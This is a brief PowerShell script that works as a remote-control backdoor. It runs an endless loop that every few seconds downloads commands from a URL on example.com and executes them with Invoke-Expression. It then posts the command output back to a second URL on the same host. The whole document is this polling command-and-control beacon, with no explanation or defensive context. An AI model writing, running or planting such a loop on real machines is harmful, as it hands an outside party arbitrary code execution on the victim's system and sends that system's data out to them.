while(1)
{
   Start-Sleep -Second 3
   $request = Invoke-RestMethod -Uri 'https://example.com/cmd1.txt'
   $data = Invoke-Expression $request
   $data1 = $data | Out-String
   $postParams = @{data=$data1}
   Invoke-RestMethod -Uri 'https://example.com/window.php' -Method 'POST' -Body $postParams

}
